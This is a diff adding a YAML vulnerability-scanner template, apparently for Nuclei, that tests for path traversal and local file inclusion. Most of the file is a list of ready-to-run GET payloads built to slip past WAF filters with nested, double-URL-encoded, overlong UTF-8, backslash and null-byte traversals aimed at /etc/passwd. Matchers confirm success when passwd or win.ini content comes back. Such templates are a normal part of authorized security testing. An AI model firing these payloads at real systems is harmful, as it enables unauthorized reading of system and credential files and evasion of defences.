@@ -1,0 +1,39 @@
+id: path-traversal-waf-bypass-encoding
+
+info:
+  name: Path Traversal via Encoding WAF Bypass
+  author: custom
+  severity: high
+  description: |
+    Tests local file inclusion / path traversal using encoding techniques
+    that bypass WAF rules blocking ../. Includes nested traversal,
+    double URL encoding, UTF-8 overlong, and null-byte variants.
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+  tags: lfi,path-traversal,waf-bypass
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=....//....//....//etc/passwd"
+      - "{{BaseURL}}/?file=..%252f..%252f..%252fetc%252fpasswd"
+      - "{{BaseURL}}/?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+      - "{{BaseURL}}/?file=..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd"
+      - "{{BaseURL}}/?file=....\\\\....\\\\....\\\\etc\\\\passwd"
+      - "{{BaseURL}}/?file=..%5c..%5c..%5cetc%5cpasswd"
+      - "{{BaseURL}}/?file=..%00/..%00/..%00/etc/passwd"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        regex:
+          - "root:x:0:0:"
+          - "daemon:x:1:1:"
+          - "\\[fonts\\]"
+          - "\\[extensions\\]"
